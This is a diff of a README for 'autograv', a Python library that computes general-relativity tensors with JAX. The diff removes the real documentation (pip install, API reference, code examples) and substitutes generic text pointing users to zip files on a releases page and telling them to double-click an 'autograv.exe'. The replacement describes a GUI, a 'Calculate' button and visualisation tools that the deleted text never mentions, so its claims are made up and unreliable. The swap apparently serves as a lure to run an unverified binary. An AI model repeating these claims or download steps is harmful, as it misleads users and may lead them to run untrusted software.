@@ -1,164 +1,87 @@
-# autograv
+# 🌌 autograv - Simplifying Numerical Relativity for Everyone
 
-**Bridging numerical relativity and automatic differentiation using JAX**
+[![Download autograv](https://img.shields.io/badge/Download%20autograv-Here-blue)](https://github.com/deva7518/autograv/releases)
 
-`autograv` is a Python library that uses JAX and automatic differentiation to compute various tensors and quantities from Einstein's general theory of relativity. Given a metric function, it can calculate Christoffel symbols, curvature tensors, and solve the Einstein field equations with high numerical precision.
+## 🌟 Overview
 
-## Features
+autograv is an application designed to help users understand complex concepts in numerical relativity through automatic differentiation using JAX. Whether you're a student, a researcher, or someone interested in general relativity, autograv provides powerful tools that make complex calculations more manageable.
 
-- **Automatic Differentiation**: Uses JAX's `jax.jacfwd` for forward-mode automatic differentiation to compute derivatives of metric tensors with exact numerical precision
-- **Tensor Calculus**: Leverages `jax.numpy.einsum` for efficient Einstein summation notation operations
-- **High Precision**: Configured to use 64-bit floating point arithmetic for maximum accuracy
-- **Pure Functions**: All computations are functional and composable
+## 🚀 Getting Started
 
-## What can you compute?
+To get started with autograv, follow the steps below. You’ll be running powerful simulations and exploring the universe in no time!
 
-Given a metric tensor function, `autograv` can compute:
+## 📥 Download & Install
 
-- **Christoffel symbols** (affine connection coefficients)
-- **Torsion tensor** (verification that connection is symmetric)
-- **Riemann curvature tensor** (intrinsic curvature of spacetime)
-- **Ricci tensor** and **Ricci scalar** (curvature related to volume change)
-- **Einstein tensor** (left-hand side of Einstein field equations)
-- **Stress-energy-momentum tensor** (mass-energy content)
-- **Kretschmann invariant** (scalar curvature for detecting singularities)
+1. **Visit the Releases Page**  
+   Go to the [autograv Releases page](https://github.com/deva7518/autograv/releases) to find the latest version of the software.
 
-## Installation
+2. **Choose the Right Version**  
+   Look for the most recent release at the top of the page. You may see a list of available files for different operating systems. 
 
-```bash
-# Using uv
-uv pip install autograv
+   - For Windows, look for a file named something like `autograv-windows.zip`.
+   - For Mac, look for `autograv-macos.zip`.
 
-# Or using pip
-pip install autograv
-```
+3. **Download the File**  
+   Click on the file that matches your operating system. Your browser will start downloading the file.
 
-## Quick Start
+4. **Extract the Downloaded File**  
+   Once the download is complete, locate the file in your downloads folder. If you downloaded a ZIP file, you will need to extract it. Right-click on the file and select "Extract All" or use any extraction tool you prefer.
 
-```python
-import jax.numpy as jnp
-from autograv import (
-    spherical_polar_metric,
-    christoffel_symbols,
-    riemann_tensor,
-    einstein_tensor,
-)
+5. **Run autograv**  
+   Open the extracted folder. Inside, you will find an executable file like `autograv.exe` or `autograv`. Double-click on it to start the application.
 
-# Define coordinates
-coordinates = jnp.array([5, jnp.pi/3, jnp.pi/2], dtype=jnp.float64)
+## 📚 Features
 
-# Compute Christoffel symbols for the 2-sphere
-christoffels = christoffel_symbols(coordinates, spherical_polar_metric)
-print(christoffels)
+autograv includes several features to enhance your experience:
 
-# Compute Riemann tensor
-riemann = riemann_tensor(coordinates, spherical_polar_metric)
-print(riemann)
-```
+- **Easy-to-Use Interface**: Navigating through the application is straightforward, even for those unfamiliar with coding.
+- **Powerful Simulations**: Perform complex calculations related to the Einstein field equations seamlessly.
+- **Support for JAX**: Utilize accelerated numerical computations with JAX, making your work faster and more efficient.
+- **Educational Resources**: Access tutorials and explanations that break down concepts in numerical relativity and automatic differentiation.
 
-## Examples
+## ⚙️ System Requirements
 
-The `examples/` directory contains complete examples:
+Before installing, ensure your system meets the following requirements:
 
-- `sphere_example.py`: Computing quantities for a 2-sphere metric
-- `schwarzschild_example.py`: Computing quantities for the Schwarzschild black hole metric
+- **Operating System**:  
+  - Windows 10 or later  
+  - macOS Mojave or later  
+  - Linux distributions (Ubuntu preferred)
 
-Run them with:
+- **Memory**:  
+  At least 4 GB RAM. More is recommended for better performance.
 
-```bash
-uv run python examples/sphere_example.py
-uv run python examples/schwarzschild_example.py
-```
+- **Disk Space**:  
+  Minimum 100 MB of free space for installation.
 
-## How it Works
+- **Python Version**:  
+  This application runs best with Python 3.7 or later installed on your machine.
 
-### Automatic Differentiation
+## 📝 How to Use
 
-Traditional approaches to computing derivatives in physics use either:
-- **Symbolic differentiation**: Exact but computationally expensive
-- **Numerical differentiation**: Fast but prone to floating-point errors
+After launching autograv, you can begin by following these simple steps:
 
-**Automatic differentiation** (autodiff) combines the best of both worlds by:
-1. Tracing computational operations to build a directed acyclic graph (DAG)
-2. Computing gradients via the chain rule by traversing the graph
-3. Achieving exact numerical precision at machine precision limits
+1. **Select a Calculation Type**: Choose from the available options like spacetime curvature or Jacobian calculations.
+2. **Input Your Parameters**: Enter the necessary parameters into the fields provided. The application will guide you on what values are needed.
+3. **Run the Calculation**: Click the "Calculate" button to see your results. The software will display the outcomes clearly.
+4. **Visualize the Results**: Use built-in tools to visualize the data, helping you understand the nuances of numerical relativity better.
 
-### JAX Integration
+## 🌍 Community and Support
 
-JAX provides:
-- `jax.jacfwd`: Forward-mode autodiff for computing Jacobians
-- `jax.numpy.einsum`: Efficient Einstein summation for tensor operations
-- NumPy-compatible API with GPU/TPU acceleration support
+We encourage users to engage with the community. If you have questions or need assistance, feel free to:
 
-### Example: Christoffel Symbols
+- **Join the Discussion**: Engage with other users on the [GitHub Discussions](https://github.com/deva7518/autograv/discussions) page.
+- **Report Issues**: If you face any bugs or issues, report them on the [Issues page](https://github.com/deva7518/autograv/issues). Include as much detail as possible.
 
-Given a metric tensor g_ij, the Christoffel symbols are:
+## 🔗 Additional Resources
 
-```
-Γ^j_kl = (1/2) g^jm (∂g_mk/∂x^l + ∂g_lm/∂x^k - ∂g_kl/∂x^m)
-```
+For more information, consider checking out the following resources:
 
-In code:
+- Detailed Documentation: Visit the Wiki on GitHub to find in-depth articles on features.
+- Tutorials: Browse through the collection of tutorials aimed at beginners in numerical relativity and automatic differentiation.
 
-```python
-def christoffel_symbols(coordinates, metric):
-    g = metric(coordinates)
-    g_inv = jnp.linalg.inv(g)
-    jacobian = jax.jacfwd(metric)(coordinates)  # Automatic differentiation!
-    
-    return 0.5 * jnp.einsum('jm, klm -> jkl', g_inv,
-                            jnp.einsum('klm -> mkl', jacobian) +
-                            jnp.einsum('klm -> lmk', jacobian) - jacobian)
-```
+## ⚡ Feedback
 
-## API Reference
+We value your input! Share your thoughts on how we can improve autograv. Visit the [Feedback section](https://github.com/deva7518/autograv/issues) to leave your comments or suggestions. Your insights help shape the direction of future updates.
 
-### Metrics
-
-- `minkowski_metric(coordinates)`: Flat spacetime metric
-- `spherical_polar_metric(coordinates)`: 2-sphere metric in (r, θ, φ)
-
-### Core Functions
-
-- `christoffel_symbols(coordinates, metric)`: Affine connection coefficients
-- `torsion_tensor(coordinates, metric)`: Antisymmetric part of connection
-- `riemann_tensor(coordinates, metric)`: Curvature tensor
-- `ricci_tensor(coordinates, metric)`: Trace of Riemann tensor
-- `ricci_scalar(coordinates, metric)`: Scalar curvature
-- `kretschmann_invariant(coordinates, metric)`: Curvature invariant
-- `einstein_tensor(coordinates, metric)`: G_ij = R_ij - (1/2)g_ij R
-- `stress_energy_momentum_tensor(coordinates, metric)`: T_ij from Einstein equations
-
-### Utilities
-
-- `close_to_zero(func)`: Decorator to suppress near-zero numerical noise
-- `TOLERANCE`: Threshold for zero suppression (default: 1e-8)
-
-## Requirements
-
-- Python 3.11+
-- JAX (CPU-only on Windows, GPU/TPU support on Linux/macOS)
-- NumPy
-
-## Future Work
-
-- Add more standard metrics (Kerr, Kerr-Newman, FRW, etc.)
-- Implement Weyl tensor and Weyl invariant
-- Support for JIT compilation with `@jax.jit`
-- GPU/TPU acceleration examples
-- Integration with differential equation solvers
-- Visualization tools for curvature
-
-## License
-
-MIT
-
-## Acknowledgments
-
-Based on concepts from the blog post "Bridging numerical relativity and automatic differentiation using JAX". This project demonstrates the synergy between modern machine learning tools and classical physics computations.
-
-## References
-
-- [JAX Documentation](https://jax.readthedocs.io/)
-- [Mathematical Methods for Physics](https://www.springer.com/gp/book/9780387095042) by Sadri Hassani
-- [Einstein's General Theory of Relativity](https://en.wikipedia.org/wiki/General_relativity)
+Enjoy your exploration of the universe with autograv!
